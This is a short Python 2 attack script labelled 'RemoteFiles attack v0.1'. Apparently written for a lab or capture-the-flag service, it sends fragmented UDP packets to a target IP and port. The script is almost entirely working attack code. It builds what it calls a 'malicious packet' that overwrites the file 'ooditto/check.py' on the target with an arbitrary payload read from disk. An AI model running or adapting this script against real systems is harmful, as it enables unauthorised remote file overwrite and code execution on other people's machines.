#!/usr/bin/python
from netfw import *
from socket import *
from struct import pack
import sys

if (len(sys.argv) != 4):
	print "RemoteFiles attack v0.1"
	print "Usage: %s <ip> <Wrapper RECV port> <Payload>" % (sys.argv[0])
	exit(0)

# Create a connection to requested destination
s = socket(AF_INET, SOCK_DGRAM)
s.connect((sys.argv[1], int(sys.argv[2])))

# Read the payload
with open(sys.argv[3], "rb") as f: payload = f.read()

# Path to override
path = "ooditto/check.py"

# Create the malicious packet
pkt = ProtocolHandleUpper(path, payload)

#print pkt.serialize()

# Fragment the packet
frags = FragmentedPacket(pkt)

# Send the fragments
for pkt in frags.fragments:
	s.send(pkt.serialize())
